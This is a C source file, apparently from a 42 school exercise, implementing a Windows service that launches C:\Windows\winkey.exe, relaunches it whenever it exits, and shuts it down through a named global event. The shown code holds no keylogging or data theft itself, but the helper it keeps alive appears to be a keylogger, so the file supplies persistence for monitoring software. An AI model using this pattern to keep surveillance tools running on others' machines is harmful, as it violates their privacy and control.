/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service_manager.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/12 20:58:33 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "svc.h"

#pragma endregion

#pragma region "Variables"

	SERVICE_STATUS          g_ServiceStatus;
	SERVICE_STATUS_HANDLE   g_StatusHandle;
	HANDLE                  g_ServiceStopEvent = NULL;
	PROCESS_INFORMATION     g_ProcessInfo = {0};
	BOOL                    g_ProcessRunning = FALSE;

#pragma endregion

#pragma region "Methods"

	#pragma region "ReportStatusToSCMgr"

		void ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
			// Reporta el estado del servicio al Service Control Manager (SCM)
			g_ServiceStatus.dwCurrentState = dwCurrentState;
			g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
			g_ServiceStatus.dwWaitHint = dwWaitHint;

			SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
		}

	#pragma endregion

	#pragma region "ServiceCtrlHandler"

		// Handler para eventos de control de servicio (cuando SCM envía un comando)
		VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
			switch (dwCtrl) {
				case SERVICE_CONTROL_STOP:
					ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 3000);

					// Señalizar evento para detener el bucle principal
					if (g_ServiceStopEvent != NULL)  SetEvent(g_ServiceStopEvent);

					// Terminar el proceso si está en ejecución
					if (g_ProcessRunning && g_ProcessInfo.hProcess != NULL) {
						// Abrir el evento de terminación que el proceso cliente está esperando
						HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
						if (hEvent) {
							// Señalizar el evento para que el cliente sepa que debe terminar
							SetEvent(hEvent);
							
							// Esperar un tiempo razonable para que el cliente se cierre limpiamente
							DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
							
							// Cerrar el handle del evento de terminación
							CloseHandle(hEvent);
							
							// Si el proceso no terminó después de esperar, forzar la terminación
							if (waitResult == WAIT_TIMEOUT) {
								TerminateProcess(g_ProcessInfo.hProcess, 0);
							}
						} else {
							// Si no podemos abrir el evento, usar terminación forzosa como fallback
							TerminateProcess(g_ProcessInfo.hProcess, 0);
						}
						
						// Limpiar los handles
						CloseHandle(g_ProcessInfo.hProcess);
						CloseHandle(g_ProcessInfo.hThread);
						g_ProcessRunning = FALSE;
					}
					break;
				case SERVICE_CONTROL_INTERROGATE:
					break;           
				default:
					break;
			}
		}

	#pragma endregion

	#pragma region "ServiceMain"

		void WINAPI ServiceMain(DWORD dwArgc, LPSTR *lpszArgv) {
			(void) dwArgc;
			(void) lpszArgv;
			// Registrar el handler de control del servicio
			g_StatusHandle = RegisterServiceCtrlHandler(Name, ServiceCtrlHandler);
			if (g_StatusHandle == NULL) return;

			// Inicialización del servicio
			g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
			g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
			g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
			g_ServiceStatus.dwWin32ExitCode = 0;
			g_ServiceStatus.dwServiceSpecificExitCode = 0;
			g_ServiceStatus.dwWaitHint = 0;

			// Crear un evento para señalizar la detención del servicio
			g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
			if (g_ServiceStopEvent == NULL) {
				ReportStatusToSCMgr(SERVICE_STOPPED, GetLastError(), 0);
				return;
			}

			// Reportar estado de "Corriendo"
			ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0);

			// Ruta al ejecutable winkey.exe en system32
			const char* targetExe = "C:\\Windows\\winkey.exe";
			
			// Bucle principal del servicio
			BOOL keepRunning = TRUE;
			while (keepRunning) {
				// Verificar si se ha solicitado detener el servicio
				if (WaitForSingleObject(g_ServiceStopEvent, 0) == WAIT_OBJECT_0) {
					keepRunning = FALSE;
					break;
				}

				// Si el proceso ya está en ejecución, revisar su estado
				if (g_ProcessRunning) {
					DWORD exitCode = 0;
					if (GetExitCodeProcess(g_ProcessInfo.hProcess, &exitCode)) {
						if (exitCode != STILL_ACTIVE) {
							// El proceso terminó, cerrar handles
							CloseHandle(g_ProcessInfo.hProcess);
							CloseHandle(g_ProcessInfo.hThread);
							g_ProcessRunning = FALSE;
						} else {
							// El proceso sigue en ejecución
							Sleep(1000);
							continue;
						}
					} else {
						// Error al obtener código de salida
						g_ProcessRunning = FALSE;
					}
				}

				// Si llegamos aquí, necesitamos iniciar el proceso
				STARTUPINFO si;
				ZeroMemory(&si, sizeof(si));
				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
				si.cb = sizeof(si);

				// Iniciar el proceso
				if (CreateProcess(
					targetExe,       // Ruta al ejecutable
					NULL,            // Argumentos de línea de comandos
					NULL,            // Atributos de seguridad de proceso
					NULL,            // Atributos de seguridad de thread
					FALSE,           // No heredar handles
					0,               // Sin flags adicionales
					NULL,            // Usar entorno del padre
					NULL,            // Usar directorio actual
					&si,             // Info de inicio
					&g_ProcessInfo   // Info del proceso
				)) {
					g_ProcessRunning = TRUE;
				} else {
					// Error al iniciar el proceso, esperar antes de reintentar
					Sleep(5000);
				}
			}

			// Si el proceso está en ejecución al salir del bucle, terminarlo
			if (g_ProcessRunning && g_ProcessInfo.hProcess != NULL) {
				// Abrir el evento de terminación que el proceso cliente está esperando
				HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, "Global\\WinkeyTerminateEvent");
				if (hEvent) {
					// Señalizar el evento para que el cliente sepa que debe terminar
					SetEvent(hEvent);
					
					// Esperar un tiempo razonable para que el cliente se cierre limpiamente
					DWORD waitResult = WaitForSingleObject(g_ProcessInfo.hProcess, 2000);
					
					// Cerrar el handle del evento de terminación
					CloseHandle(hEvent);
					
					// Si el proceso no terminó después de esperar, forzar la terminación
					if (waitResult == WAIT_TIMEOUT) {
						TerminateProcess(g_ProcessInfo.hProcess, 0);
					}
				} else {
					// Si no podemos abrir el evento, usar terminación forzosa como fallback
					TerminateProcess(g_ProcessInfo.hProcess, 0);
				}
				
				// Limpiar los handles
				CloseHandle(g_ProcessInfo.hProcess);
				CloseHandle(g_ProcessInfo.hThread);
				g_ProcessRunning = FALSE;
			}

			// Limpiar
			CloseHandle(g_ServiceStopEvent);

			// Detener el servicio cuando termine su trabajo
			ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0);
		}

	#pragma endregion

#pragma endregion
